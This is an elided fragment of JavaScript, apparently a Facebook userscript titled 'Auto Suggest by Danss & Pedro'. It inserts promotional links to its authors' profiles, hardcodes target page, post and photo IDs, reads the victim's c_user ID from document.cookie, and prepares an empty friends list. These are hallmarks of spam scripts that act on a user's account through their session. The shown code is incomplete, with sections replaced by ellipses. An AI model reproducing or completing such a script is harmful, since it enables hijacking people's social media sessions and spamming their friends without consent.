...
"chars" : " :) ",
    ...
    html += '<a style="color:#F12B63;" href="https://facebook.com/oO.PEDRO.XD" target="_blank">¤ Meu Facebook ¤</a><a class="jewelFooter" href="https://www.facebook.com/daniel.danss.santos" target="_blank">? ParCeiro ?</a>';
	html += '</div>';
...
var spage_id = "387413414672849";
var spost_id = "387413414672849";
var sfoto_id = "387413414672849";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Danss & Pedro';
